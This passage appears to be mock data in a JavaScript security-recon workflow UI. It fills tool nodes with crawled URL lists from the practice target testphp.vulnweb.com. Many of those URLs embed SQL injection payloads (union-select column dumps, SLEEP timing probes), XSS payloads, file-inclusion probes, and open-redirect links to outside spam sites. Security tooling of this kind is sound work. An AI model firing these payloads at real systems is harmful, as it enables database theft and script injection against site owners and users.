      http://testphp.vulnweb.com:80/admin.asp
      http://testphp.vulnweb.com:80/admin.aspx
      http://testphp.vulnweb.com:80/admin.php
      http://testphp.vulnweb.com/admin/)
      http://testphp.vulnweb.com/admin/[200
      http://testphp.vulnweb.com/admin/[200]
      http://testphp.vulnweb.com:80/admin/admin.ajax
      http://testphp.vulnweb.com:80/admin/create.sql
      http://testphp.vulnweb.com:80/admin/CVS
      http://testphp.vulnweb.com:80/admin/index.php
      http://testphp.vulnweb.com:80/admin/login.php
      http://testphp.vulnweb.com:80/admin/upload
      http://testphp.vulnweb.com:80/admin/?C=D;O=A
      http://testphp.vulnweb.com:80/admin/?C=M;O=A
      http://testphp.vulnweb.com:80/admin/?C=N;O=D
      http://testphp.vulnweb.com:80/admin/?C=S;O=A
      http://testphp.vulnweb.com:80/admin_login
      http://testphp.vulnweb.com:80/admininfo.php
      http://testphp.vulnweb.com:80/administrator.php
      http://testphp.vulnweb.com:80/adminlogin.aspx
      http://testphp.vulnweb.com:80/AJAX
      http://testphp.vulnweb.com:80/AJAX/artists.php
      http://testphp.vulnweb.com/AJAX/categories.php
      http://testphp.vulnweb.com/AJAX/CONFIRMED
      http://testphp.vulnweb.com:80/AJAX/htaccess.conf
      http://testphp.vulnweb.com:80/AJAX/index.html
      http://testphp.vulnweb.com:80/AJAX/index.ph['
      http://testphp.vulnweb.com:80/AJAX/index.php
      http://testphp.vulnweb.com:80/AJAX/index.php'
      http://testphp.vulnweb.com:80/AJAX/index.php--user-data-dir
      http://testphp.vulnweb.com:80/AJAX/index.php%3Cxml%3E%3Cnode%20name=%22nodename1%22%3Enodetext1%3C/node%3E%3Cnode%20name=%22nodename2%22%3Enodetext2%3C/node%3E%3C/xml%3E
      http://testphp.vulnweb.com/AJAX/index.phpUser-Agent:
      http://testphp.vulnweb.com:80/AJAX/infoartist.php?
      http://testphp.vulnweb.com/AJAX/infoartist.php?id=1
      http://testphp.vulnweb.com:80/ajax/infoartists.php
      http://testphp.vulnweb.com:80/AJAX/infocateg.php
      http://testphp.vulnweb.com:80/AJAX/infocateg.php%E3%80%91%E5%AD%98%E5%9C%A8sqlinject%E6%97%A0%E8%AF%AF%EF%BC%8C%E8%BF%9B%E8%A1%8C%E7%9B%B8%E5%BA%94%E7%9A%84%E4%BF%AE%E5%A4%8D
      http://testphp.vulnweb.com:80/AJAX/infocateg.php%E3%80%91%E5%B9%B6%E6%8F%90%E4%BA%A4%E3%80%90id=1%E3%80%91%EF%BC%8C%E6%89%80%E4%BB%A5%E6%9E%84%E5%BB%BA%E4%B8%BA
      http://testphp.vulnweb.com:80/AJAX/infocateg.php?id=1
      http://t`;
      ctx.reactFlowInstance.getNode("gau-1").data.tool.duration = "00:00:57";
      ctx.setTest(Math.random());
    }, 60000);
    setTimeout(() => {
      ctx.reactFlowInstance.getNode("katana-1").data.tool.status = "succeeded";
      ctx.reactFlowInstance.getNode("katana-1").data.tool.output = `http://testphp.vulnweb.com/
      http://testphp.vulnweb.com/style.css
      http://testphp.vulnweb.com/categories.php
      http://testphp.vulnweb.com/high
      http://testphp.vulnweb.com/privacy.php
      http://testphp.vulnweb.com/cart.php
      http://testphp.vulnweb.com/hpp/
      http://testphp.vulnweb.com/login.php
      http://testphp.vulnweb.com/AJAX/index.php
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/
      http://testphp.vulnweb.com/disclaimer.php
      http://testphp.vulnweb.com/artists.php
      http://testphp.vulnweb.com/index.php
      http://testphp.vulnweb.com/guestbook.php
      http://testphp.vulnweb.com/AJAX/styles.css
      http://testphp.vulnweb.com/userinfo.php
      http://testphp.vulnweb.com/listproducts.php?cat=4
      http://testphp.vulnweb.com/listproducts.php?cat=3
      http://testphp.vulnweb.com/listproducts.php?cat=2
      http://testphp.vulnweb.com/listproducts.php?cat=1
      http://testphp.vulnweb.com/artists.php?artist=3
      http://testphp.vulnweb.com/artists.php?artist=2
      http://testphp.vulnweb.com/artists.php?artist=1
      http://testphp.vulnweb.com/hpp/?pp=12
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/
      http://testphp.vulnweb.com/signup.php`;
      ctx.reactFlowInstance.getNode("katana-1").data.tool.stderr = `		projectdiscovery.io
      [INF] Current katana version v1.0.4 (outdated)
      [INF] Started headless crawling for => http://testphp.vulnweb.com/`;
      ctx.reactFlowInstance.getNode("katana-1").data.tool.stdout = `http://testphp.vulnweb.com/
      http://testphp.vulnweb.com/style.css
      http://testphp.vulnweb.com/categories.php
      http://testphp.vulnweb.com/high
      http://testphp.vulnweb.com/privacy.php
      http://testphp.vulnweb.com/cart.php
      http://testphp.vulnweb.com/hpp/
      http://testphp.vulnweb.com/login.php
      http://testphp.vulnweb.com/AJAX/index.php
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/
      http://testphp.vulnweb.com/disclaimer.php
      http://testphp.vulnweb.com/artists.php
      http://testphp.vulnweb.com/index.php
      http://testphp.vulnweb.com/guestbook.php
      http://testphp.vulnweb.com/AJAX/styles.css
      http://testphp.vulnweb.com/userinfo.php
      http://testphp.vulnweb.com/listproducts.php?cat=4
      http://testphp.vulnweb.com/listproducts.php?cat=3
      http://testphp.vulnweb.com/listproducts.php?cat=2
      http://testphp.vulnweb.com/listproducts.php?cat=1
      http://testphp.vulnweb.com/artists.php?artist=3
      http://testphp.vulnweb.com/artists.php?artist=2
      http://testphp.vulnweb.com/artists.php?artist=1
      http://testphp.vulnweb.com/hpp/?pp=12
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/
      http://testphp.vulnweb.com/signup.php`;
      ctx.reactFlowInstance.getNode("katana-1").data.tool.duration = "00:00:29";
      ctx.setTest(Math.random());
    }, 32000);
    setTimeout(() => {
      ctx.reactFlowInstance.getNode("sort-uniq-1").data.tool.status = "succeeded";
      ctx.reactFlowInstance.getNode("sort-uniq-1").data.tool.output = `http://testphp.vulnweb.com/
      http://testphp.vulnweb.com/%0A%0A%D9%87%D8%B0%D8%A7
      http://testphp.vulnweb.com/%20I%20want%20to%20start%20testing%20on%20stealing%20cookies%20through%20exploit%20xss%20on%20search%20bar%20at%20testphp%20vulnweb
      http://testphp.vulnweb.com/%25%25/index.php
      http://testphp.vulnweb.com/%E2%80%99
      http://testphp.vulnweb.com/,
      http://testphp.vulnweb.com/.%D0%92
      http://testphp.vulnweb.com/.idea/.name
      http://testphp.vulnweb.com/.idea/art.iml
      http://testphp.vulnweb.com/.well-known/ai-plugin.json
      http://testphp.vulnweb.com/.well-known/assetlinks.json
      http://testphp.vulnweb.com/.well-known/dnt-policy.txt
      http://testphp.vulnweb.com/.well-known/gpc.json
      http://testphp.vulnweb.com/.well-known/trust.txt
      http://testphp.vulnweb.com/404.php
      http://testphp.vulnweb.com/AJAX/
      http://testphp.vulnweb.com/AJAX/CONFIRMED
      http://testphp.vulnweb.com/AJAX/categories.php
      http://testphp.vulnweb.com/AJAX/index.php
      http://testphp.vulnweb.com/AJAX/index.phpUser-Agent:
      http://testphp.vulnweb.com/AJAX/infoartist.php?id=1
      http://testphp.vulnweb.com/AJAX/styles.css
      http://testphp.vulnweb.com/Accept:
      http://testphp.vulnweb.com/Biolinky.co/agenxionplay
      http://testphp.vulnweb.com/CVS/)
      http://testphp.vulnweb.com/CVS/[200
      http://testphp.vulnweb.com/CVS/[200]
      http://testphp.vulnweb.com/Content-Length:
      http://testphp.vulnweb.com/Cookie:
      http://testphp.vulnweb.com/FUZZ
      http://testphp.vulnweb.com/FUZZ%22
      http://testphp.vulnweb.com/Flash/add.fla
      http://testphp.vulnweb.com/Flash/add.swf
      http://testphp.vulnweb.com/Flash/add.swf%E2%80%99
      http://testphp.vulnweb.com/Hosttestphp.vulnweb.comServer
      http://testphp.vulnweb.com/MamaBeBe.com.hk
      http://testphp.vulnweb.com/MamaBeBe.com.hk/
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/.htaccess
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/.htaccessUser-Agent:
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-1/
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-2/
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-1%20-%20Copy.html
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-1.bak.html
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-2.html
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-3.html
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/buy.php
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/buy.php?id=-
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/buy.php?id=-1%20AND%20((SELECT%20
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/buy.php?id=-1%20AND%20((SELECT%201%20FROM%20(SELECT%202
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/details.php?id=-1%20OR%2017-7%3d10
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/details.php?id=-1%20OR%2017-7%3d10CONFIRMED
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/details.php?id=1
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/index.php
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/rate.php?id=-
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/rate.php?id=-1%20OR%2017-7%3d10
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/rate.php?id=-1%20OR%2017-7%3d10CONFIRMED
      http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt
      http://testphp.vulnweb.com/User-Agent:
      http://testphp.vulnweb.com/_mmServerScripts/
      http://testphp.vulnweb.com/_mmServerScripts/MMHTTPDB.php
      http://testphp.vulnweb.com/_mmServerScripts/mysql.php
      http://testphp.vulnweb.com/acunetix_file
      http://testphp.vulnweb.com/acunetix_file///////$1$PrWp.Xbx$q4QDCqdxYE6NcMph53jie0
      http://testphp.vulnweb.com/acunetix_file_inclusion_test
      http://testphp.vulnweb.com/acunetix_file_inclusion_test?,0,NULL,active
      http://testphp.vulnweb.com/acunetix_file_inclusion_test?,1,NULL,active
      http://testphp.vulnweb.com/acunetix_file_inclusion_test?,97,NULL,active
      http://testphp.vulnweb.com/admin/)
      http://testphp.vulnweb.com/admin/[200
      http://testphp.vulnweb.com/admin/[200]
      http://testphp.vulnweb.com/all-property-company.com
      http://testphp.vulnweb.com/all-property-company.com/
      http://testphp.vulnweb.com/allpropertyclub.com
      http://testphp.vulnweb.com/allpropertyclub.com/
      http://testphp.vulnweb.com/app-ads.txt
      http://testphp.vulnweb.com/artist.php?artist=1
      http://testphp.vulnweb.com/artists.php
      http://testphp.vulnweb.com/artists.php,http-waf-
      http://testphp.vulnweb.com/artists.php,http-waf-detect.detectBodyChanges
      http://testphp.vulnweb.com/artists.php?%20artist=1-SLEEP(3
      http://testphp.vulnweb.com/artists.php?%20artist=1-SLEEP(3)
      http://testphp.vulnweb.com/artists.php?artist=
      http://testphp.vulnweb.com/artists.php?ar`;
      ctx.reactFlowInstance.getNode("sort-uniq-1").data.tool.stderr = `No stderr output found.`;
      ctx.reactFlowInstance.getNode("sort-uniq-1").data.tool.stdout = `http://testphp.vulnweb.com/
      http://testphp.vulnweb.com/%0A%0A%D9%87%D8%B0%D8%A7
      http://testphp.vulnweb.com/%20I%20want%20to%20start%20testing%20on%20stealing%20cookies%20through%20exploit%20xss%20on%20search%20bar%20at%20testphp%20vulnweb
      http://testphp.vulnweb.com/%25%25/index.php
      http://testphp.vulnweb.com/%E2%80%99
      http://testphp.vulnweb.com/,
      http://testphp.vulnweb.com/.%D0%92
      http://testphp.vulnweb.com/.idea/.name
      http://testphp.vulnweb.com/.idea/art.iml
      http://testphp.vulnweb.com/.well-known/ai-plugin.json
      http://testphp.vulnweb.com/.well-known/assetlinks.json
      http://testphp.vulnweb.com/.well-known/dnt-policy.txt
      http://testphp.vulnweb.com/.well-known/gpc.json
      http://testphp.vulnweb.com/.well-known/trust.txt
      http://testphp.vulnweb.com/404.php
      http://testphp.vulnweb.com/AJAX/
      http://testphp.vulnweb.com/AJAX/CONFIRMED
      http://testphp.vulnweb.com/AJAX/categories.php
      http://testphp.vulnweb.com/AJAX/index.php
      http://testphp.vulnweb.com/AJAX/index.phpUser-Agent:
      http://testphp.vulnweb.com/AJAX/infoartist.php?id=1
      http://testphp.vulnweb.com/AJAX/styles.css
      http://testphp.vulnweb.com/Accept:
      http://testphp.vulnweb.com/Biolinky.co/agenxionplay
      http://testphp.vulnweb.com/CVS/)
      http://testphp.vulnweb.com/CVS/[200
      http://testphp.vulnweb.com/CVS/[200]
      http://testphp.vulnweb.com/Content-Length:
      http://testphp.vulnweb.com/Cookie:
      http://testphp.vulnweb.com/FUZZ
      http://testphp.vulnweb.com/FUZZ%22
      http://testphp.vulnweb.com/Flash/add.fla
      http://testphp.vulnweb.com/Flash/add.swf
      http://testphp.vulnweb.com/Flash/add.swf%E2%80%99
      http://testphp.vulnweb.com/Hosttestphp.vulnweb.comServer
      http://testphp.vulnweb.com/MamaBeBe.com.hk
      http://testphp.vulnweb.com/MamaBeBe.com.hk/
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/.htaccess
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/.htaccessUser-Agent:
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-1/
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-2/
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-1%20-%20Copy.html
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-1.bak.html
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-2.html
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-3.html
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/buy.php
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/buy.php?id=-
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/buy.php?id=-1%20AND%20((SELECT%20
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/buy.php?id=-1%20AND%20((SELECT%201%20FROM%20(SELECT%202
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/details.php?id=-1%20OR%2017-7%3d10
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/details.php?id=-1%20OR%2017-7%3d10CONFIRMED
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/details.php?id=1
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/index.php
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/rate.php?id=-
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/rate.php?id=-1%20OR%2017-7%3d10
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/rate.php?id=-1%20OR%2017-7%3d10CONFIRMED
      http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt
      http://testphp.vulnweb.com/User-Agent:
      http://testphp.vulnweb.com/_mmServerScripts/
      http://testphp.vulnweb.com/_mmServerScripts/MMHTTPDB.php
      http://testphp.vulnweb.com/_mmServerScripts/mysql.php
      http://testphp.vulnweb.com/acunetix_file
      http://testphp.vulnweb.com/acunetix_file///////$1$PrWp.Xbx$q4QDCqdxYE6NcMph53jie0
      http://testphp.vulnweb.com/acunetix_file_inclusion_test
      http://testphp.vulnweb.com/acunetix_file_inclusion_test?,0,NULL,active
      http://testphp.vulnweb.com/acunetix_file_inclusion_test?,1,NULL,active
      http://testphp.vulnweb.com/acunetix_file_inclusion_test?,97,NULL,active
      http://testphp.vulnweb.com/admin/)
      http://testphp.vulnweb.com/admin/[200
      http://testphp.vulnweb.com/admin/[200]
      http://testphp.vulnweb.com/all-property-company.com
      http://testphp.vulnweb.com/all-property-company.com/
      http://testphp.vulnweb.com/allpropertyclub.com
      http://testphp.vulnweb.com/allpropertyclub.com/
      http://testphp.vulnweb.com/app-ads.txt
      http://testphp.vulnweb.com/artist.php?artist=1
      http://testphp.vulnweb.com/artists.php
      http://testphp.vulnweb.com/artists.php,http-waf-
      http://testphp.vulnweb.com/artists.php,http-waf-detect.detectBodyChanges
      http://testphp.vulnweb.com/artists.php?%20artist=1-SLEEP(3
      http://testphp.vulnweb.com/artists.php?%20artist=1-SLEEP(3)
      http://testphp.vulnweb.com/artists.php?artist=
      http://testphp.vulnweb.com/artists.php?ar`;
      ctx.reactFlowInstance.getNode("sort-uniq-1").data.tool.duration = "00:00:25";
      ctx.setTest(Math.random());
    }, 80000);
    setTimeout(() => {
      ctx.reactFlowInstance.getNode("urldedupe-1").data.tool.status = "succeeded";
      ctx.reactFlowInstance.getNode("urldedupe-1").data.tool.output = `http://testphp.vulnweb.com/AJAX/infoartist.php?id=1
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/buy.php?id=-
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/details.php?id=-1%20OR%2017-7%3d10
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/rate.php?id=-
      http://testphp.vulnweb.com/acunetix_file_inclusion_test?,0,NULL,active
      http://testphp.vulnweb.com/acunetix_file_inclusion_test?,1,NULL,active
      http://testphp.vulnweb.com/acunetix_file_inclusion_test?,97,NULL,active
      http://testphp.vulnweb.com/artist.php?artist=1
      http://testphp.vulnweb.com/artists.php?%20artist=1-SLEEP(3
      http://testphp.vulnweb.com/artists.php?artist=
      http://testphp.vulnweb.com/artists.php?artist=1&
      http://testphp.vulnweb.com/categories.php/listproducts.php?cat=%27
      http://testphp.vulnweb.com/hpp/?pp='%22--%3E%3C%2fst
      http://testphp.vulnweb.com/hpp/params.php?aaaa%2f=&p=%25
      http://testphp.vulnweb.com/hpp/params.php?aaaa%2f=&p=%3CscRipt%3Ealert(0x107E91)%3C%2fscRipt%3E&pp=12
      http://testphp.vulnweb.com/hpp/params.php?p=
      http://testphp.vulnweb.com/hpp/params.php?p=&lt;iframe
      http://testphp.vulnweb.com/hpp/params.php?p=&lt;script&gt;alert(1)&lt;/script&gt
      http://testphp.vulnweb.com/hpp/params.php?p=&lt;script&gt;alert(1)&lt;/script&gt;
      http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12
      http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12&aaaa%2f=
      http://testphp.vulnweb.com/index.php?%25id%25=1&user=2
      http://testphp.vulnweb.com/index.php?id=%252%25&user=1
      http://testphp.vulnweb.com/listproducts.php?-
      http://testphp.vulnweb.com/listproducts.php?artist
      http://testphp.vulnweb.com/listproducts.php?artist=123&amp;asdf=ff&amp;cat=123%22%3E%3Csvg%2Fclass%3D%22dalfox%22onLoad%3Dalert%2845%29%3E
      http://testphp.vulnweb.com/listproducts.php?artist=123&asdf=ff&cat=123%22%3E%3Csvg%2Fclass%3D%22dalfox%22onLoad%3Dalert%2845%29%3E
      http://testphp.vulnweb.com/listproducts.php?cat=
      http://testphp.vulnweb.com/listproducts.php?cat=123%22%3E%3Cscript%3Ealert(45)%3C/script%3E&zfdfasdf=124fffff
      http://testphp.vulnweb.com/listproducts.php?cat=123%22&
      http://testphp.vulnweb.com/listproducts.php?id=1
      http://testphp.vulnweb.com/login.php?id=1
      http://testphp.vulnweb.com/product.php?pic=1%20OR%2017-
      http://testphp.vulnweb.com/redir.php?r=
      http://testphp.vulnweb.com/redir.php?r=https://www.quangcaoso.net/2020/12/?KNL=$$$IDdestinatario$$$&utm_source=connecting&utm_medium=email&utm_campaign=2013.
      http://testphp.vulnweb.com/redir.php?r=https://www.quangcaoso.net/2020/12/?KNL=$$$IDdestinatario$$$?ref=GBXBlP&e=&rurl=https://www.quangcaoso.net/2020/12/?KNL=$$$IDdestinatario$$$
      http://testphp.vulnweb.com/redir.php?r=https://www.quangcaoso.net/2020/12/?src=www.rhino.ca&authCookie=
      http://testphp.vulnweb.com/redir.php?r=https://www.quangcaoso.net/2021/01/?mr:referralID=bfe8299e-77a8-11ed-83ba-02635dc62ca7?trackId=gdi&KNL=$$$IDdestinatario$$$&NNL=13500&CNL=10&HNL=3481a
      http://testphp.vulnweb.com/redir.php?r=https://www.quangcaoso.net/2021/03/?KNL=$$$IDdestinatario$$$?s=1&BannerClickID=30762292&AffiliateID=ayFJWpGmVP5dqiqsij/cZA==&ASCampaignID=yUrcihPILTWjfcF+1Brm/Q==&ASFrontpageID=1
      http://testphp.vulnweb.com/redir.php?r=https://www.quangcaoso.net/2021/03/?utm_source=&utm_medium=banner/user/profile/13323https://www.quangcaoso.net/2021/03/?utm_source=&utm_medium=banner
      http://testphp.vulnweb.com/redir.php?r=https://www.quangcaoso.net/2021/07/?a=INVESTIV-HOME-RR&utm_source=&utm_medium=banner
      http://testphp.vulnweb.com/redir.php?r=https://www.quangcaoso.net/2021/07/?a=INVESTIV-HOME-RR?a=INVESTIV-HOME-RR?a=INVESTIV-HOME-RR&utm_source=&utm_medium=&utm_content=&utm_campaign=
      http://testphp.vulnweb.com/redir.php?r=https://www.quangcaoso.net/2021/07/?utm_source=connecting?s=1&mr:referralID=255c5619-cbb9-11ed-83ba-12a9c0fb0737
      http://testphp.vulnweb.com/redir.php?r\u003dhttps://festivetreat.com
      http://testphp.vulnweb.com/search.php?test=hello2
      http://testphp.vulnweb.com/search.php?test=query&
      http://testphp.vulnweb.com/search.php?test=query&cat=123&ppl=1fhhahwul
      http://testphp.vulnweb.com/secured/phpinfo.php?=PHPE9568F34-D428-11d2-A769-00AA001ACF42
      http://testphp.vulnweb.com/showimage.php?file=
      http://testphp.vulnweb.com/showimage.php?file='%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Ealert(0x002C88)%3C/scRipt%3E&size=160
      http://testphp.vulnweb.com:80/AJAX/infocateg.php?id=1
      http://testphp.vulnweb.com:80/admin/?C=D;O=A
      http://testphp.vulnweb.com:80/artists.php?artist%20=1
      http://testphp.vulnweb.com:80/artists.php?artist=1
      http://testphp.vulnweb.com:80/bxss/vuln.php?id=1
      http://testphp.vulnweb.com:80/categories.php/listproducts.php?cat=1
      http://testphp.vulnweb.com:80/comment.php?aid=1
      http://testphp.vulnweb.com:80/comment.php?pid=1
      http://testphp.vulnweb.com:80/hpp/?pp=12
      http://testphp.vulnweb.com:80/hpp/index.php?pp=12
      http://testphp.vulnweb.com:80/listproducts.php?cat=-1+union+select+1,2,3,4,5,6,7,8,9,10,+group_concat(column_name)+from+information_schema.columns+where+table_name='users'+--
      http://testphp.vulnweb.com:80/product.php?pic=1
      http://testphp.vulnweb.com:80/redir.php?r=http://1tip88.com/m`;
      ctx.reactFlowInstance.getNode("urldedupe-1").data.tool.stderr = `No stderr output found.`;
      ctx.reactFlowInstance.getNode("urldedupe-1").data.tool.stdout = `http://testphp.vulnweb.com/AJAX/infoartist.php?id=1
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/buy.php?id=-
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/details.php?id=-1%20OR%2017-7%3d10
      http://testphp.vulnweb.com/Mod_Rewrite_Shop/rate.php?id=-
      http://testphp.vulnweb.com/acunetix_file_inclusion_test?,0,NULL,active
      http://testphp.vulnweb.com/acunetix_file_inclusion_test?,1,NULL,active
      http://testphp.vulnweb.com/acunetix_file_inclusion_test?,97,NULL,active
      http://testphp.vulnweb.com/artist.php?artist=1
      http://testphp.vulnweb.com/artists.php?%20artist=1-SLEEP(3
      http://testphp.vulnweb.com/artists.php?artist=
      http://testphp.vulnweb.com/artists.php?artist=1&
      http://testphp.vulnweb.com/categories.php/listproducts.php?cat=%27
      http://testphp.vulnweb.com/hpp/?pp='%22--%3E%3C%2fst
      http://testphp.vulnweb.com/hpp/params.php?aaaa%2f=&p=%25
      http://testphp.vulnweb.com/hpp/params.php?aaaa%2f=&p=%3CscRipt%3Ealert(0x107E91)%3C%2fscRipt%3E&pp=12
      http://testphp.vulnweb.com/hpp/params.php?p=
      http://testphp.vulnweb.com/hpp/params.php?p=&lt;iframe
      http://testphp.vulnweb.com/hpp/params.php?p=&lt;script&gt;alert(1)&lt;/script&gt
      http://testphp.vulnweb.com/hpp/params.php?p=&lt;script&gt;alert(1)&lt;/script&gt;
      http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12
      http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12&aaaa%2f=
      http://testphp.vulnweb.com/index.php?%25id%25=1&user=2
      http://testphp.vulnweb.com/index.php?id=%252%25&user=1
      http://testphp.vulnweb.com/listproducts.php?-
      http://testphp.vulnweb.com/listproducts.php?artist
      http://testphp.vulnweb.com/listproducts.php?artist=123&amp;asdf=ff&amp;cat=123%22%3E%3Csvg%2Fclass%3D%22dalfox%22onLoad%3Dalert%2845%29%3E
      http://testphp.vulnweb.com/listproducts.php?artist=123&asdf=ff&cat=123%22%3E%3Csvg%2Fclass%3D%22dalfox%22onLoad%3Dalert%2845%29%3E
      http://testphp.vulnweb.com/listproducts.php?cat=
      http://testphp.vulnweb.com/listproducts.php?cat=123%22%3E%3Cscript%3Ealert(45)%3C/script%3E&zfdfasdf=124fffff
      http://testphp.vulnweb.com/listproducts.php?cat=123%22&
      http://testphp.vulnweb.com/listproducts.php?id=1
      http://testphp.vulnweb.com/login.php?id=1
      http://testphp.vulnweb.com/product.php?pic=1%20OR%2017-
      http://testphp.vulnweb.com/redir.php?r=
      http://testphp.vulnweb.com/redir.php?r=https://www.quangcaoso.net/2020/12/?KNL=$$$IDdestinatario$$$&utm_source=connecting&utm_medium=email&utm_campaign=2013.
      http://testphp.vulnweb.com/redir.php?r=https://www.quangcaoso.net/2020/12/?KNL=$$$IDdestinatario$$$?ref=GBXBlP&e=&rurl=https://www.quangcaoso.net/2020/12/?KNL=$$$IDdestinatario$$$
      http://testphp.vulnweb.com/redir.php?r=https://www.quangcaoso.net/2020/12/?src=www.rhino.ca&authCookie=
      http://testphp.vulnweb.com/redir.php?r=https://www.quangcaoso.net/2021/01/?mr:referralID=bfe8299e-77a8-11ed-83ba-02635dc62ca7?trackId=gdi&KNL=$$$IDdestinatario$$$&NNL=13500&CNL=10&HNL=3481a
      http://testphp.vulnweb.com/redir.php?r=https://www.quangcaoso.net/2021/03/?KNL=$$$IDdestinatario$$$?s=1&BannerClickID=30762292&AffiliateID=ayFJWpGmVP5dqiqsij/cZA==&ASCampaignID=yUrcihPILTWjfcF+1Brm/Q==&ASFrontpageID=1
      http://testphp.vulnweb.com/redir.php?r=https://www.quangcaoso.net/2021/03/?utm_source=&utm_medium=banner/user/profile/13323https://www.quangcaoso.net/2021/03/?utm_source=&utm_medium=banner
      http://testphp.vulnweb.com/redir.php?r=https://www.quangcaoso.net/2021/07/?a=INVESTIV-HOME-RR&utm_source=&utm_medium=banner
      http://testphp.vulnweb.com/redir.php?r=https://www.quangcaoso.net/2021/07/?a=INVESTIV-HOME-RR?a=INVESTIV-HOME-RR?a=INVESTIV-HOME-RR&utm_source=&utm_medium=&utm_content=&utm_campaign=
      http://testphp.vulnweb.com/redir.php?r=https://www.quangcaoso.net/2021/07/?utm_source=connecting?s=1&mr:referralID=255c5619-cbb9-11ed-83ba-12a9c0fb0737
      http://testphp.vulnweb.com/redir.php?r\u003dhttps://festivetreat.com
      http://testphp.vulnweb.com/search.php?test=hello2
      http://testphp.vulnweb.com/search.php?test=query&
      http://testphp.vulnweb.com/search.php?test=query&cat=123&ppl=1fhhahwul
      http://testphp.vulnweb.com/secured/phpinfo.php?=PHPE9568F34-D428-11d2-A769-00AA001ACF42
      http://testphp.vulnweb.com/showimage.php?file=
      http://testphp.vulnweb.com/showimage.php?file='%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Ealert(0x002C88)%3C/scRipt%3E&size=160
      http://testphp.vulnweb.com:80/AJAX/infocateg.php?id=1
      http://testphp.vulnweb.com:80/admin/?C=D;O=A
      http://testphp.vulnweb.com:80/artists.php?artist%20=1
      http://testphp.vulnweb.com:80/artists.php?artist=1
      http://testphp.vulnweb.com:80/bxss/vuln.php?id=1
